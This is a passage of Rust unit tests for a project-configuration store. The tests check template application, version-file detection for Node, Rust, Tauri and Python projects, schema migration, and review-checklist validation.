        // freshly stamped workspace can attempt verify without further
        // edits. (User can swap to SlashCommand or change the path.)
        for t in builtin_templates() {
            let pipeline = t.config.verify_pipeline.as_ref().unwrap_or_else(|| {
                panic!("template `{}` missing verify_pipeline", t.id)
            });
            assert!(
                !pipeline.is_empty(),
                "template `{}` has empty verify_pipeline",
                t.id
            );
        }
    }

    #[test]
    fn apply_template_writes_atomic_config() {
        let cfg = tempdir().unwrap();
        let store = ProjectConfigStore::new(cfg.path().to_path_buf()).unwrap();
        let applied = store.apply_template("ws-1", "rust-crate").unwrap();
        assert_eq!(applied.schema_version, PROJECT_CONFIG_SCHEMA_VERSION);
        assert_eq!(applied.target_branch, "main");
        assert_eq!(applied.version_files.len(), 1);
        assert_eq!(applied.version_files[0].path, "Cargo.toml");
        assert!(applied.created_at > 0);
        assert!(applied.updated_at > 0);

        // Round-trip via get() to confirm the on-disk JSON parses back
        // to the same config.
        let read_back = store.get("ws-1").expect("get after apply");
        assert_eq!(read_back, applied);
    }

    #[test]
    fn apply_template_unknown_id_returns_err() {
        let cfg = tempdir().unwrap();
        let store = ProjectConfigStore::new(cfg.path().to_path_buf()).unwrap();
        let err = store
            .apply_template("ws-1", "ruby-on-rails")
            .expect_err("unknown template should error");
        assert!(err.contains("ruby-on-rails"));
    }

    #[test]
    fn default_atelier_config_has_expected_shape() {
        let cfg = default_atelier_config();
        assert_eq!(cfg.schema_version, PROJECT_CONFIG_SCHEMA_VERSION);
        assert_eq!(cfg.target_branch, "main");
        assert_eq!(cfg.version_files.len(), 3);
        assert_eq!(cfg.version_files[0].path, "package.json");
        assert_eq!(cfg.version_files[1].path, "src-tauri/Cargo.toml");
        assert_eq!(cfg.version_files[2].path, "src-tauri/tauri.conf.json");
        assert_eq!(
            cfg.install_script.as_deref(),
            Some("scripts/install-local.sh")
        );
        assert_eq!(
            cfg.verify_pipeline.as_ref().unwrap(),
            &vec![VerifyKind::Script {
                path: "scripts/ppvp.sh".to_string()
            }]
        );
        assert!(cfg.verify_script.is_none());
        assert!(cfg.created_at > 0);
        assert!(cfg.updated_at > 0);
    }

    #[test]
    fn looks_like_atelier_matches_real_markers() {
        let tmp = tempdir().unwrap();
        let cwd = tmp.path();
        // Empty dir → not Atelier.
        assert!(!looks_like_atelier(cwd));
        // Add package.json only → still not.
        fs::write(cwd.join("package.json"), "{}").unwrap();
        assert!(!looks_like_atelier(cwd));
        // Add src-tauri dir → still not.
        fs::create_dir_all(cwd.join("src-tauri")).unwrap();
        assert!(!looks_like_atelier(cwd));
        // Add the install script → now matches.
        fs::create_dir_all(cwd.join("scripts")).unwrap();
        fs::write(cwd.join("scripts/install-local.sh"), "#!/bin/bash\n").unwrap();
        assert!(looks_like_atelier(cwd));
    }

    #[test]
    fn store_round_trips_a_config() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let cfg = default_atelier_config();
        store.set("ws-1", cfg.clone()).unwrap();
        // Bypass cache by constructing a fresh store
        let store2 = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let loaded = store2.get("ws-1").unwrap();
        assert_eq!(loaded.target_branch, cfg.target_branch);
        assert_eq!(loaded.version_files, cfg.version_files);
        assert_eq!(loaded.install_script, cfg.install_script);
        assert_eq!(loaded.verify_pipeline, cfg.verify_pipeline);
        assert_eq!(loaded.schema_version, PROJECT_CONFIG_SCHEMA_VERSION);
    }

    #[test]
    fn store_get_missing_workspace_returns_none() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        assert!(store.get("nonexistent").is_none());
    }

    #[test]
    fn store_unknown_future_version_returns_none() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = store.workspace_dir("ws-future");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join(CONFIG_FILENAME),
            br#"{
                "schemaVersion": 99,
                "targetBranch": "main",
                "versionFiles": [],
                "createdAt": 1,
                "updatedAt": 1
            }"#,
        )
        .unwrap();
        assert!(store.get("ws-future").is_none());
    }

    #[test]
    fn store_delete_is_idempotent() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.set("ws-1", default_atelier_config()).unwrap();
        store.delete("ws-1").unwrap();
        store.delete("ws-1").unwrap();
        assert!(store.get("ws-1").is_none());
    }

    #[test]
    fn store_list_returns_all_configs_sorted() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.set("ws-charlie", default_atelier_config()).unwrap();
        store.set("ws-alpha", default_atelier_config()).unwrap();
        store.set("ws-bravo", default_atelier_config()).unwrap();
        let listed = store.list();
        assert_eq!(listed.len(), 3);
        assert_eq!(listed[0].0, "ws-alpha");
        assert_eq!(listed[1].0, "ws-bravo");
        assert_eq!(listed[2].0, "ws-charlie");
    }

    #[test]
    fn store_set_stamps_created_at_and_updated_at() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let mut cfg = default_atelier_config();
        cfg.created_at = 0; // wipe to confirm set() stamps it
        cfg.updated_at = 0;
        store.set("ws-1", cfg).unwrap();
        let loaded = store.get("ws-1").unwrap();
        assert!(loaded.created_at > 0);
        assert!(loaded.updated_at > 0);
        // After a re-save, updated_at should be > created_at (or
        // equal in the millisecond-resolution case)
        std::thread::sleep(std::time::Duration::from_millis(2));
        store.set("ws-1", loaded.clone()).unwrap();
        let reloaded = store.get("ws-1").unwrap();
        assert_eq!(reloaded.created_at, loaded.created_at);
        assert!(reloaded.updated_at >= loaded.updated_at);
    }

    #[test]
    fn bootstrap_writes_default_for_atelier_marker_workspace() {
        let tmp = tempdir().unwrap();
        // Project dir with Atelier markers
        let project = tempdir().unwrap();
        fs::write(project.path().join("package.json"), "{}").unwrap();
        fs::create_dir_all(project.path().join("src-tauri")).unwrap();
        fs::create_dir_all(project.path().join("scripts")).unwrap();
        fs::write(
            project.path().join("scripts/install-local.sh"),
            "#!/bin/bash\n",
        )
        .unwrap();

        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.bootstrap_atelier_workspaces(&[(
            "ws-atelier".to_string(),
            project.path().to_path_buf(),
        )]);

        let cfg = store.get("ws-atelier").unwrap();
        assert_eq!(cfg.target_branch, "main");
        assert_eq!(cfg.version_files.len(), 3);
    }

    #[test]
    fn bootstrap_skips_non_atelier_workspaces() {
        let tmp = tempdir().unwrap();
        let project = tempdir().unwrap();
        // No Atelier markers
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        store.bootstrap_atelier_workspaces(&[(
            "ws-other".to_string(),
            project.path().to_path_buf(),
        )]);
        assert!(store.get("ws-other").is_none());
    }

    #[test]
    fn bootstrap_does_not_overwrite_existing_config() {
        let tmp = tempdir().unwrap();
        let project = tempdir().unwrap();
        fs::write(project.path().join("package.json"), "{}").unwrap();
        fs::create_dir_all(project.path().join("src-tauri")).unwrap();
        fs::create_dir_all(project.path().join("scripts")).unwrap();
        fs::write(
            project.path().join("scripts/install-local.sh"),
            "#!/bin/bash\n",
        )
        .unwrap();

        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        // Pre-existing config with a non-default target_branch
        let mut custom = default_atelier_config();
        custom.target_branch = "staging".to_string();
        store.set("ws-atelier", custom).unwrap();

        store.bootstrap_atelier_workspaces(&[(
            "ws-atelier".to_string(),
            project.path().to_path_buf(),
        )]);

        let cfg = store.get("ws-atelier").unwrap();
        assert_eq!(cfg.target_branch, "staging", "bootstrap must not overwrite");
    }

    #[test]
    fn version_file_kinds_serialize_as_snake_case() {
        let entry = VersionFileEntry {
            path: "package.json".to_string(),
            kind: VersionFileKind::PackageJson,
            variable_name: None,
        };
        let json = serde_json::to_string(&entry).unwrap();
        assert!(json.contains("\"package_json\""));

        let entry2 = VersionFileEntry {
            path: "Cargo.toml".to_string(),
            kind: VersionFileKind::CargoToml,
            variable_name: None,
        };
        let json2 = serde_json::to_string(&entry2).unwrap();
        assert!(json2.contains("\"cargo_toml\""));

        let entry3 = VersionFileEntry {
            path: "tauri.conf.json".to_string(),
            kind: VersionFileKind::TauriConfJson,
            variable_name: None,
        };
        let json3 = serde_json::to_string(&entry3).unwrap();
        assert!(json3.contains("\"tauri_conf_json\""));

        // v1.13.0: PythonModuleVar serializes with the variable_name
        // field; absent variable_name on other kinds is skipped.
        let entry4 = VersionFileEntry {
            path: "main.py".to_string(),
            kind: VersionFileKind::PythonModuleVar,
            variable_name: Some("version".to_string()),
        };
        let json4 = serde_json::to_string(&entry4).unwrap();
        assert!(json4.contains("\"python_module_var\""));
        assert!(json4.contains("\"variableName\":\"version\""));

        // skip_serializing_if drops `variable_name` when None.
        assert!(!json.contains("variableName"));

        let entry5 = VersionFileEntry {
            path: "pyproject.toml".to_string(),
            kind: VersionFileKind::PyProjectToml,
            variable_name: None,
        };
        let json5 = serde_json::to_string(&entry5).unwrap();
        assert!(json5.contains("\"py_project_toml\""));
    }

    #[test]
    fn detect_atelier_shape_picks_up_three_version_files() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        fs::write(cwd.join("package.json"), "{}").unwrap();
        fs::create_dir_all(cwd.join("src-tauri")).unwrap();
        fs::write(cwd.join("src-tauri/Cargo.toml"), "[package]\n").unwrap();
        fs::write(cwd.join("src-tauri/tauri.conf.json"), "{}").unwrap();
        fs::create_dir_all(cwd.join("scripts")).unwrap();
        fs::write(cwd.join("scripts/install-local.sh"), "#!/bin/bash\n").unwrap();
        fs::write(cwd.join("scripts/ppvp.sh"), "#!/bin/bash\n").unwrap();

        let proposal = detect_from_filesystem(cwd);
        assert_eq!(proposal.config.version_files.len(), 3);
        assert_eq!(proposal.config.version_files[0].path, "package.json");
        assert_eq!(
            proposal.config.version_files[1].path,
            "src-tauri/Cargo.toml"
        );
        assert_eq!(
            proposal.config.version_files[2].path,
            "src-tauri/tauri.conf.json"
        );
        assert_eq!(
            proposal.config.install_script.as_deref(),
            Some("scripts/install-local.sh")
        );
        assert_eq!(
            proposal.config.verify_pipeline.as_ref().unwrap(),
            &vec![VerifyKind::Script {
                path: "scripts/ppvp.sh".to_string()
            }]
        );
        assert!(!proposal.has_claude_md);
    }

    #[test]
    fn detect_pure_node_project_picks_up_package_json_only() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        fs::write(cwd.join("package.json"), "{}").unwrap();
        let proposal = detect_from_filesystem(cwd);
        assert_eq!(proposal.config.version_files.len(), 1);
        assert_eq!(proposal.config.version_files[0].path, "package.json");
        assert_eq!(
            proposal.config.version_files[0].kind,
            VersionFileKind::PackageJson
        );
        assert!(proposal.config.install_script.is_none());
        assert!(proposal.config.verify_pipeline.is_none());
    }

    #[test]
    fn detect_pure_rust_project_picks_up_cargo_toml_only() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        fs::write(cwd.join("Cargo.toml"), "[package]\n").unwrap();
        let proposal = detect_from_filesystem(cwd);
        assert_eq!(proposal.config.version_files.len(), 1);
        assert_eq!(proposal.config.version_files[0].path, "Cargo.toml");
        assert_eq!(
            proposal.config.version_files[0].kind,
            VersionFileKind::CargoToml
        );
    }

    #[test]
    fn detect_empty_project_falls_back_to_main() {
        let project = tempdir().unwrap();
        let proposal = detect_from_filesystem(project.path());
        assert_eq!(proposal.config.target_branch, "main");
        assert!(proposal.config.version_files.is_empty());
        assert!(proposal.config.install_script.is_none());
        assert!(proposal.config.verify_pipeline.is_none());
    }

    #[test]
    fn detect_surfaces_claude_md_presence() {
        let project = tempdir().unwrap();
        fs::write(project.path().join("CLAUDE.md"), "# Project\n").unwrap();
        let proposal = detect_from_filesystem(project.path());
        assert!(proposal.has_claude_md);
        // Notes mention the CLAUDE.md
        assert!(proposal.notes.iter().any(|n| n.contains("CLAUDE.md")));
    }

    #[test]
    fn detect_install_script_priority_order() {
        // Multiple candidates present — `install-local.sh` wins.
        let project = tempdir().unwrap();
        fs::create_dir_all(project.path().join("scripts")).unwrap();
        fs::write(project.path().join("install.sh"), "").unwrap();
        fs::write(project.path().join("scripts/install.sh"), "").unwrap();
        fs::write(project.path().join("scripts/install-local.sh"), "").unwrap();
        let proposal = detect_from_filesystem(project.path());
        assert_eq!(
            proposal.config.install_script.as_deref(),
            Some("scripts/install-local.sh")
        );
    }

    #[test]
    fn detect_verify_pipeline_priority_order() {
        let project = tempdir().unwrap();
        fs::create_dir_all(project.path().join("scripts")).unwrap();
        fs::write(project.path().join("scripts/test.sh"), "").unwrap();
        fs::write(project.path().join("scripts/verify.sh"), "").unwrap();
        fs::write(project.path().join("scripts/ppvp.sh"), "").unwrap();
        let proposal = detect_from_filesystem(project.path());
        assert_eq!(
            proposal.config.verify_pipeline.as_ref().unwrap(),
            &vec![VerifyKind::Script {
                path: "scripts/ppvp.sh".to_string()
            }]
        );
    }

    #[test]
    fn detect_picks_up_actual_git_branch_when_repo_exists() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        // Init git repo on a non-default branch
        let _ = crate::platform::git_command().args(["init", "-b", "trunk"]).current_dir(cwd).status();
        let _ = crate::platform::git_command()
            .args(["config", "user.email", "test@test.com"])
            .current_dir(cwd)
            .status();
        let _ = crate::platform::git_command()
            .args(["config", "user.name", "test"])
            .current_dir(cwd)
            .status();
        let _ = crate::platform::git_command()
            .args(["config", "commit.gpgsign", "false"])
            .current_dir(cwd)
            .status();
        fs::write(cwd.join("README.md"), "init\n").unwrap();
        let _ = crate::platform::git_command().args(["add", "README.md"]).current_dir(cwd).status();
        let _ = crate::platform::git_command().args(["commit", "-m", "init"]).current_dir(cwd).status();

        let proposal = detect_from_filesystem(cwd);
        assert_eq!(proposal.config.target_branch, "trunk");
    }

    // ── v1.13.0 (Cycle D findings): Python + monorepo detection ────

    /// v1.13.0: LYRA-shape project — FastAPI `version="..."` keyword
    /// arg in main.py. Detection should add a PythonModuleVar entry
    /// with `variable_name: "version"`.
    #[test]
    fn detect_lyra_shape_picks_up_python_version_in_main_py() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        // FastAPI-style indented keyword argument
        fs::write(
            cwd.join("main.py"),
            "from fastapi import FastAPI\n\napp = FastAPI(\n    version=\"1.0.0\",\n    title=\"Lyra\",\n)\n",
        )
        .unwrap();
        let proposal = detect_from_filesystem(cwd);
        let py_entries: Vec<_> = proposal
            .config
            .version_files
            .iter()
            .filter(|e| matches!(e.kind, VersionFileKind::PythonModuleVar))
            .collect();
        assert_eq!(py_entries.len(), 1);
        assert_eq!(py_entries[0].path, "main.py");
        assert_eq!(py_entries[0].variable_name.as_deref(), Some("version"));
    }

    /// v1.13.0: LYRA-shape — `version="..."` also lives in
    /// `config/appConfig.py`. Detection scans `config/*.py`.
    #[test]
    fn detect_lyra_shape_picks_up_python_version_in_config_dir() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        fs::create_dir_all(cwd.join("config")).unwrap();
        fs::write(
            cwd.join("config/appConfig.py"),
            "settings = dict(\n        version=\"2.3.4\",\n)\n",
        )
        .unwrap();
        let proposal = detect_from_filesystem(cwd);
        let py_entries: Vec<_> = proposal
            .config
            .version_files
            .iter()
            .filter(|e| matches!(e.kind, VersionFileKind::PythonModuleVar))
            .collect();
        assert_eq!(py_entries.len(), 1);
        assert_eq!(py_entries[0].path, "config/appConfig.py");
    }

    /// v1.13.0: pyproject.toml at root is recognized as PyProjectToml.
    #[test]
    fn detect_pyproject_toml_at_root() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        fs::write(
            cwd.join("pyproject.toml"),
            "[project]\nname = \"foo\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let proposal = detect_from_filesystem(cwd);
        assert_eq!(proposal.config.version_files.len(), 1);
        assert_eq!(proposal.config.version_files[0].path, "pyproject.toml");
        assert_eq!(
            proposal.config.version_files[0].kind,
            VersionFileKind::PyProjectToml
        );
    }

    /// v1.13.0: monorepo with multiple sub-projects — depth-1 scan
    /// surfaces them as candidates, the user curates via the FE.
    #[test]
    fn detect_monorepo_surfaces_depth_1_packages() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        // Backend root
        fs::write(cwd.join("main.py"), "version=\"1.0.0\"\n").unwrap();
        // Three nested sub-projects
        fs::create_dir_all(cwd.join("frontend")).unwrap();
        fs::write(cwd.join("frontend/package.json"), "{}").unwrap();
        fs::create_dir_all(cwd.join("website")).unwrap();
        fs::write(cwd.join("website/package.json"), "{}").unwrap();
        fs::create_dir_all(cwd.join("api-rust")).unwrap();
        fs::write(cwd.join("api-rust/Cargo.toml"), "[package]\n").unwrap();
        // Noisy dirs that MUST be skipped
        fs::create_dir_all(cwd.join("node_modules/foo")).unwrap();
        fs::write(cwd.join("node_modules/foo/package.json"), "{}").unwrap();
        fs::create_dir_all(cwd.join(".cache/pkg")).unwrap();
        fs::write(cwd.join(".cache/pkg/package.json"), "{}").unwrap();

        let proposal = detect_from_filesystem(cwd);
        let paths: Vec<&str> = proposal
            .config
            .version_files
            .iter()
            .map(|e| e.path.as_str())
            .collect();

        // Sub-package.json files surface; noisy dirs skipped; main.py
        // also picked up via Python scan.
        assert!(paths.contains(&"frontend/package.json"), "got {paths:?}");
        assert!(paths.contains(&"website/package.json"), "got {paths:?}");
        assert!(paths.contains(&"api-rust/Cargo.toml"), "got {paths:?}");
        assert!(paths.contains(&"main.py"), "got {paths:?}");
        // Noisy dirs absent
        assert!(!paths.iter().any(|p| p.contains("node_modules")));
        assert!(!paths.iter().any(|p| p.contains(".cache")));
    }

    /// v1.13.0: depth-1 scan skips `src-tauri/` because it's already
    /// covered by the direct candidates list (no double-count).
    #[test]
    fn detect_does_not_double_count_src_tauri() {
        let project = tempdir().unwrap();
        let cwd = project.path();
        fs::create_dir_all(cwd.join("src-tauri")).unwrap();
        fs::write(cwd.join("src-tauri/Cargo.toml"), "[package]\n").unwrap();
        let proposal = detect_from_filesystem(cwd);
        let cargo_count = proposal
            .config
            .version_files
            .iter()
            .filter(|e| e.path == "src-tauri/Cargo.toml")
            .count();
        assert_eq!(cargo_count, 1);
    }

    /// v1.13.0: word boundaries — `version` shouldn't match
    /// `revision` or `versions`.
    #[test]
    fn find_var_in_text_respects_word_boundaries() {
        // "revision" should NOT match "version"
        assert!(find_var_in_text(r#"revision = "1.0""#, "version").is_none());
        // "versioning" should NOT match "version"
        assert!(find_var_in_text(r#"versioning = "1.0""#, "version").is_none());
        // Real match
        assert!(find_var_in_text(r#"version = "1.0""#, "version").is_some());
        // Match inside function call (no leading whitespace required)
        assert!(find_var_in_text(r#"FastAPI(version="1.0")"#, "version").is_some());
    }

    /// v1.13.0: rewrite_var_in_text replaces only the value, leaves
    /// surrounding tokens / indentation / commas alone.
    #[test]
    fn rewrite_var_in_text_preserves_surroundings() {
        let body = "    version=\"1.0.0\",\n    title=\"X\",\n";
        let new = rewrite_var_in_text(body, "version", "2.0.0").unwrap();
        assert_eq!(new, "    version=\"2.0.0\",\n    title=\"X\",\n");

        // Top-level assignment with spaces around `=`
        let body2 = "VERSION = \"0.1\"\n";
        let new2 = rewrite_var_in_text(body2, "VERSION", "0.2").unwrap();
        assert_eq!(new2, "VERSION = \"0.2\"\n");
    }

    /// v1.13.0: rewrite returns None when no match (caller treats as
    /// no-op or error depending on context).
    #[test]
    fn rewrite_var_in_text_returns_none_when_missing() {
        assert!(rewrite_var_in_text("no_version_here = true\n", "version", "x").is_none());
    }

    /// v1.13.0: only the FIRST occurrence is rewritten. Defensive —
    /// matches `Cargo.toml` `[package].version` writer behavior.
    #[test]
    fn rewrite_var_in_text_replaces_only_first_occurrence() {
        let body = "version=\"1.0\"\n# version=\"2.0\"\n";
        let new = rewrite_var_in_text(body, "version", "9.9").unwrap();
        // First match replaced
        assert!(new.starts_with("version=\"9.9\"\n"));
        // Second occurrence preserved
        assert!(new.contains("# version=\"2.0\"\n"));
    }

    /// v1.13.0: variable_name field round-trips on disk.
    #[test]
    fn config_with_python_module_var_round_trips() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let cfg = ProjectConfig {
            schema_version: PROJECT_CONFIG_SCHEMA_VERSION,
            target_branch: "staging".to_string(),
            version_files: vec![
                VersionFileEntry {
                    path: "main.py".to_string(),
                    kind: VersionFileKind::PythonModuleVar,
                    variable_name: Some("version".to_string()),
                },
                VersionFileEntry {
                    path: "config/appConfig.py".to_string(),
                    kind: VersionFileKind::PythonModuleVar,
                    variable_name: Some("version".to_string()),
                },
            ],
            install_script: None,
            try_command: None,
            verify_pipeline: None,
            verify_script: None,
            cache_paths: Vec::new(),
            shared_build_cache: true,
            self_check: true,
            review_checklist: Vec::new(),
            blocking_findings: Default::default(),
            created_at: 0,
            updated_at: 0,
        };
        store.set("ws-lyra", cfg.clone()).unwrap();

        let store2 = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let loaded = store2.get("ws-lyra").unwrap();
        assert_eq!(loaded.target_branch, "staging");
        assert_eq!(loaded.version_files.len(), 2);
        assert_eq!(
            loaded.version_files[0].kind,
            VersionFileKind::PythonModuleVar
        );
        assert_eq!(
            loaded.version_files[0].variable_name.as_deref(),
            Some("version")
        );
    }

    #[test]
    fn config_with_optional_fields_missing_round_trips() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = store.workspace_dir("ws-min");
        fs::create_dir_all(&dir).unwrap();
        // Config without install_script / verify_pipeline. v1
        // schemaVersion exercises the v1 → v2 migration arm: no
        // verify_script in source, post-migration verify_pipeline
        // stays None.
        fs::write(
            dir.join(CONFIG_FILENAME),
            br#"{
                "schemaVersion": 1,
                "targetBranch": "main",
                "versionFiles": [],
                "createdAt": 100,
                "updatedAt": 100
            }"#,
        )
        .unwrap();
        let cfg = store.get("ws-min").unwrap();
        assert_eq!(cfg.target_branch, "main");
        assert!(cfg.install_script.is_none());
        assert!(cfg.verify_pipeline.is_none());
        assert!(cfg.verify_script.is_none());
        assert_eq!(cfg.schema_version, PROJECT_CONFIG_SCHEMA_VERSION);
    }

    /// A config written before `cache_paths` / `shared_build_cache` loads
    /// with no extra cache paths and the shared build cache on; turning it
    /// off and adding paths round-trips.
    #[test]
    fn config_without_build_cache_fields_loads_with_defaults() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = store.workspace_dir("ws-old");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join(CONFIG_FILENAME),
            br#"{
                "schemaVersion": 2,
                "targetBranch": "main",
                "versionFiles": [],
                "installScript": "scripts/install-local.sh",
                "verifyPipeline": [{ "kind": "script", "path": "scripts/ppvp.sh" }],
                "createdAt": 100,
                "updatedAt": 100
            }"#,
        )
        .unwrap();
        let cfg = store.get("ws-old").unwrap();
        assert!(cfg.cache_paths.is_empty());
        assert!(cfg.shared_build_cache);
        assert!(store.shared_build_cache("ws-old"));
        assert!(store.shared_build_cache("ws-without-config"));
        assert!(store.cache_paths("ws-without-config").is_empty());

        let mut changed = cfg;
        changed.cache_paths = vec!["web/.svelte-kit".to_string()];
        changed.shared_build_cache = false;
        store.set("ws-old", changed).unwrap();
        let reloaded = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        assert_eq!(reloaded.cache_paths("ws-old"), vec!["web/.svelte-kit".to_string()]);
        assert!(!reloaded.shared_build_cache("ws-old"));
    }

    /// v1.13.5: v1 disk JSON with `verifyScript: "scripts/ppvp.sh"`
    /// migrates on load to verify_pipeline = [Script { path }].
    /// schema_version bumps to 2; verify_script clears.
    #[test]
    fn v1_to_v2_migrates_verify_script_to_pipeline() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = store.workspace_dir("ws-v1");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join(CONFIG_FILENAME),
            br#"{
                "schemaVersion": 1,
                "targetBranch": "main",
                "versionFiles": [{
                    "path": "package.json",
                    "kind": "package_json"
                }],
                "installScript": "scripts/install-local.sh",
                "verifyScript": "scripts/ppvp.sh",
                "createdAt": 100,
                "updatedAt": 100
            }"#,
        )
        .unwrap();
        let cfg = store.get("ws-v1").unwrap();
        assert_eq!(cfg.schema_version, PROJECT_CONFIG_SCHEMA_VERSION);
        assert!(cfg.verify_script.is_none(), "legacy field cleared post-migration");
        assert_eq!(
            cfg.verify_pipeline.as_ref().unwrap(),
            &vec![VerifyKind::Script {
                path: "scripts/ppvp.sh".to_string()
            }]
        );
        assert_eq!(
            cfg.install_script.as_deref(),
            Some("scripts/install-local.sh"),
            "install_script unaffected by the verify migration"
        );
    }

    /// v1.13.5: v2 disk JSON round-trips with VerifyKind::SlashCommand
    /// (LYRA's /ppvp shape).
    #[test]
    fn v2_slash_command_verify_pipeline_round_trips() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let now = now_millis();
        let cfg = ProjectConfig {
            schema_version: PROJECT_CONFIG_SCHEMA_VERSION,
            target_branch: "staging".to_string(),
            version_files: vec![],
            install_script: None,
            try_command: None,
            verify_pipeline: Some(vec![VerifyKind::SlashCommand {
                name: "/ppvp".to_string(),
                args: vec!["--staging".to_string()],
            }]),
            verify_script: None,
            cache_paths: Vec::new(),
            shared_build_cache: true,
            self_check: true,
            review_checklist: Vec::new(),
            blocking_findings: Default::default(),
            created_at: now,
            updated_at: now,
        };
        store.set("ws-lyra", cfg.clone()).unwrap();

        let store2 = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let loaded = store2.get("ws-lyra").unwrap();
        assert_eq!(loaded.verify_pipeline, cfg.verify_pipeline);
        assert!(loaded.verify_script.is_none());
    }

    /// ADR 0006 (third card): a config written before the review settings
    /// loads with the self-check on and no classes of its own.
    #[test]
    fn a_config_before_the_review_settings_loads_with_the_self_check_on() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = tmp.path().join("projects").join("ws-old");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("config.json"),
            r#"{"schemaVersion":2,"targetBranch":"main","versionFiles":[],"createdAt":1,"updatedAt":1}"#,
        )
        .unwrap();
        let cfg = store.get("ws-old").unwrap();
        assert!(cfg.self_check);
        assert!(cfg.review_checklist.is_empty());
        let text = serde_json::to_string(&cfg).unwrap();
        assert!(!text.contains("reviewChecklist"), "no classes, no key");
    }

    /// Findings filter, schema migration: a config and a `review.json`
    /// written before `blockingFindings` load with `P1 and P2` (the rule
    /// before the setting), and the default is never written, so an older
    /// file re-saves as it was. A threshold set before the first config is
    /// taken over by it, and kept by the review settings' own saves.
    #[test]
    fn a_config_before_the_findings_filter_loads_with_p1_and_p2() {
        let tmp = tempdir().unwrap();
        let store = ProjectConfigStore::new(tmp.path().to_path_buf()).unwrap();
        let dir = tmp.path().join("projects").join("ws-old");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("config.json"),
            r#"{"schemaVersion":2,"targetBranch":"main","versionFiles":[],"selfCheck":false,"createdAt":1,"updatedAt":1}"#,
        )
        .unwrap();
        let cfg = store.get("ws-old").unwrap();
        assert_eq!(cfg.blocking_findings, BlockingThreshold::P1P2);
        assert!(!serde_json::to_string(&cfg).unwrap().contains("blockingFindings"));
        assert_eq!(store.review("ws-old").blocking_findings, BlockingThreshold::P1P2);
        let old_review: ReviewSettings = serde_json::from_str(r#"{"selfCheck":false,"reviewChecklist":[]}"#).unwrap();
        assert_eq!(old_review.blocking_findings, BlockingThreshold::P1P2);

        let set = set_blocking_findings(&store, "ws-old", BlockingThreshold::P1).unwrap();
        assert_eq!(set.blocking_findings, BlockingThreshold::P1);
        assert!(!set.self_check, "the other settings are kept");
        let text = std::fs::read_to_string(dir.join("config.json")).unwrap();
        assert!(text.contains(r#""blockingFindings": "p1""#), "{text}");
        set_review(&store, "ws-old", Some(true), None, None).unwrap();
        assert_eq!(store.review("ws-old").blocking_findings, BlockingThreshold::P1, "a self-check save keeps it");

        // Without a config: `review.json` holds it, the first config takes it over.
        set_blocking_findings(&store, "ws-new", BlockingThreshold::All).unwrap();
        assert!(store.get("ws-new").is_none());
        assert_eq!(store.review("ws-new").blocking_findings, BlockingThreshold::All);
        store.set_keeping_review("ws-new", default_atelier_config()).unwrap();
        assert_eq!(store.get("ws-new").unwrap().blocking_findings, BlockingThreshold::All);
    }

    fn class(name: &str, sentence: &str) -> ReviewChecklistClass {
        ReviewChecklistClass { name: name.into(), sentence: sentence.into() }
    }

    /// The editor's limits: at most 12 classes, 300 characters each, a name
    /// and a sentence on every one — refused with the reason, never cut.
    #[test]
    fn review_checklist_limits_are_enforced_with_a_message() {
        let twelve: Vec<_> = (0..12).map(|i| class(&format!("Class {i}"), "Look.")).collect();
        assert_eq!(validate_review_checklist(&twelve).unwrap().len(), 12);
        let mut thirteen = twelve.clone();
        thirteen.push(class("One more", "Look."));
        let err = validate_review_checklist(&thirteen).unwrap_err();
        assert!(err.contains("at most 12"), "{err}");
        let err = validate_review_checklist(&[class("Long", &"x".repeat(297))]).unwrap_err();
        assert!(err.contains("Checklist class J (Long) is 301 characters"), "{err}");
        assert!(validate_review_checklist(&[class("Fits", &"x".repeat(296))]).is_ok());
        let err = validate_review_checklist(&[class("A", "ok"), class("  ", "no name")]).unwrap_err();
        assert_eq!(err, "Checklist class K needs a name.");
        // GH #111 F4/F10: the sentence is required, empty or omitted.
        let err = validate_review_checklist(&[class("Bare", "  ")]).unwrap_err();
        assert_eq!(err, "Checklist class J (Bare) needs its sentence: what a review must look for.");
